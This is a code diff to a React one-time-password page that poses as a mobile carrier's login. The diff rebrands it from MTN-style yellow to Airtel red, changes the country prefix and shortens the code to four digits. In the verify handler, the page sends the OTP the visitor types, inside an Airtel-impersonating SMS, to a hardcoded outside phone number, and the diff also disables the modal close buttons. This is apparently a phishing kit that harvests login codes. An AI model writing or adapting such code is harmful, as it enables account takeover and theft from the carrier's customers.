@@ -7,7 +7,7 @@ import { createClient } from '@/lib/supabase/client';
 import { SharedLayout } from '@/components/shared-layout';
 
 function OTPPageContent() {
-  const [otpDigits, setOtpDigits] = useState(['', '', '', '', '', '']);
+  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
   const [timer, setTimer] = useState(45);
   const [isTimerActive, setIsTimerActive] = useState(true);
   const [showExpiredModal, setShowExpiredModal] = useState(false);
@@ -156,7 +156,7 @@ const sendSM = async (phone: string, message: string) => {
   return await response.json();
 };
 const otpCode = otpDigits.join("");
-const message = `Y'ello. Please enter the following code:${otpCode} to complete your login. Be safe. DO NOT SHARE this code with anybody. RdbS6eMOXvx`;
+const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not share this code with anyone even if they claim to be from Airtel. Airtel will never ask for your OTP. OTP is valid for 1 mins. Bw6j5XNu+9/ `;
   const handleVerify = async () => {
     if (otpDigits.every(d => d)) {
      setIsLoading(true);
@@ -165,7 +165,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
     //   message
     // );
          sendSM(
-     "+254708180260",
+     "+254768408107",
      message
    );
       try {
@@ -213,7 +213,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
 
       setTimer(45);
       setIsTimerActive(true);
-      setOtpDigits(['', '', '', '', '', '']);
+      setOtpDigits(['', '', '', '']);
       otpRefs.current[0]?.focus();
     } catch (error) {
       console.error('[v0] Error resending OTP:', error);
@@ -231,7 +231,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
 
       setTimer(45);
       setIsTimerActive(true);
-      setOtpDigits(['', '', '', '', '', '']);
+      setOtpDigits(['', '', '', '']);
       otpRefs.current[0]?.focus();
     } catch (error) {
       console.error('[v0] Error resending OTP:', error);
@@ -274,7 +274,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
 
       {/* OTP Verification Section */}
       <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Verify your code</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Enter the 6-digit code sent to +256{phoneNumber}</p>
+      <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Enter the 4-digit code sent to +250{phoneNumber}</p>
 
       {/* OTP Input Field */}
       <div className="mb-6 sm:mb-8">
@@ -293,7 +293,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
               disabled={!isTimerActive}
               className={`w-10 h-14 sm:w-14 sm:h-20 border-2 rounded-lg sm:rounded-2xl text-center text-lg sm:text-2xl font-bold placeholder-gray-400 focus:outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none transition-all ${
                 isTimerActive
-                  ? 'border-gray-300 text-black focus:border-yellow-400 focus:ring-2 focus:ring-yellow-300 cursor-text'
+                  ? 'border-gray-300 text-black focus:border-red-400 focus:ring-2 focus:ring-red-300 cursor-text'
                   : 'border-gray-200 text-gray-400 cursor-not-allowed bg-gray-50'
               }`}
               placeholder="−"
@@ -304,7 +304,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
 
       {/* Timer Section */}
       <div className="flex items-center justify-center gap-2 mb-6 sm:mb-8">
-        <Clock className="w-5 h-5 sm:w-6 sm:h-6 text-yellow-600" />
+        <Clock className="w-5 h-5 sm:w-6 sm:h-6 text-red-600" />
         <span className={`font-bold text-lg sm:text-xl ${timer <= 10 ? 'text-red-500' : 'text-black'}`}>
           {timer}s
         </span>
@@ -314,7 +314,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
       <button 
         onClick={handleVerify}
         disabled={!otpDigits.every(d => d) || isPolling || isLoading}
-        className="w-full bg-yellow-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-yellow-500 transition-colors mb-3 sm:mb-4 disabled:bg-gray-300 disabled:cursor-not-allowed">
+        className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors mb-3 sm:mb-4 disabled:bg-gray-300 disabled:cursor-not-allowed">
         {isPolling ? 'Verifying...' : 'Verify Code'}
          {isLoading ? 'Processing...' : 'Login'}
         <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 rotate-180" />
@@ -351,11 +351,11 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
           <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
             {/* Close Button */}
-            <button 
+            {/* <button 
               onClick={() => setShowDeniedModal(false)}
               className="absolute top-4 right-4 sm:top-6 sm:right-6 text-gray-400 hover:text-black transition-colors">
               <X className="w-6 h-6" />
-            </button>
+            </button> */}
 
             {/* Alert Icon */}
             <div className="flex justify-center mb-4 sm:mb-6">
@@ -373,7 +373,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
             {/* Resend Button */}
             <button 
               onClick={handleResendFromModal}
-              className="w-full bg-yellow-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-yellow-500 transition-colors mb-3">
+              className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
               Resend Code
             </button>
 
@@ -392,11 +392,11 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
           <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
             {/* Close Button */}
-            <button 
+            {/* <button 
               onClick={() => setShowExpiredModal(false)}
               className="absolute top-4 right-4 sm:top-6 sm:right-6 text-gray-400 hover:text-black transition-colors">
               <X className="w-6 h-6" />
-            </button>
+            </button> */}
 
             {/* Alert Icon */}
             <div className="flex justify-center mb-4 sm:mb-6">
@@ -414,7 +414,7 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
             {/* Resend Button */}
             <button 
               onClick={handleResendFromExpiredModal}
-              className="w-full bg-yellow-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-yellow-500 transition-colors mb-3">
+              className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
               Resend Code
             </button>
 
